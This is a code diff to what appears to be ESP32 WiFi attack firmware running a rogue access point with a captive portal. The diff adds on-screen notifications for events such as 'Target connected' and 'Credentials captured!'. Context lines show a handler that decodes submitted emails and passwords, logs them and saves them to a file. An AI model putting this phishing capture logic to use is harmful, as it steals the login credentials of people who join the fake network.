@@ -26,6 +26,7 @@
 #include "managers/rgb_manager.h"
 #include "managers/settings_manager.h"
 #include "managers/status_display_manager.h"
+#include "gui/toast.h"
 #include "nvs_flash.h"
 #include <core/dns_server.h>
 #include <ctype.h>
@@ -511,11 +512,13 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
         case WIFI_EVENT_AP_STACONNECTED:
             ap_connection_count++;
             glog("WiFi_manager: Station connected to AP\n");
+            toast_show("Target connected", TOAST_INFO);
             esp_wifi_set_ps(WIFI_PS_NONE);
             break;
         case WIFI_EVENT_AP_STADISCONNECTED:
             if (ap_connection_count > 0) ap_connection_count--;
             glog("WiFi_manager: Station disconnected from AP\n");
+            toast_show("Target disconnected", TOAST_WARN);
             login_done = false;
             if (ap_connection_count == 0) {
                 esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
@@ -544,6 +547,7 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
             break;
         case IP_EVENT_AP_STAIPASSIGNED:
             glog("Assigned IP to STA\n");
+            toast_show("Target got IP", TOAST_INFO);
             ap_sta_has_ip = true;
             break;
         default:
@@ -596,10 +600,12 @@ static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t e
         if (manual_disconnect) {
             glog("WiFi disconnected manually\n");
             status_display_show_status("WiFi Disconnected");
+            toast_show("WiFi disconnected", TOAST_WARN);
             manual_disconnect = false; // Reset the flag
         } else {
             glog("WiFi disconnected: %s (reason %d)\n", reason_str, disconnected->reason);
             status_display_show_status("WiFi Lost");
+            toast_show("WiFi lost", TOAST_WARN);
         }
         
         xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
@@ -607,6 +613,7 @@ static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t e
         ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
         glog("Got IP: %s\n", ip4addr_ntoa(&event->ip_info.ip));
         status_display_show_status("WiFi Connected");
+        toast_show("WiFi connected", TOAST_SUCCESS);
 
         /* Set reliable fallback DNS servers so external resolution doesn't
          * depend entirely on the router's DNS. DHCP sets DNS_MAIN (index 0);
@@ -1029,6 +1036,7 @@ esp_err_t get_info_handler(httpd_req_t *req) {
             url_decode(decoded_password, pass_val);
         }
         glog("Captured credentials: %s / %s\n", decoded_email, decoded_password);
+        toast_show("Credentials captured!", TOAST_SUCCESS);
 
         if (current_creds_filename[0] != '\0') {
             char line[128];
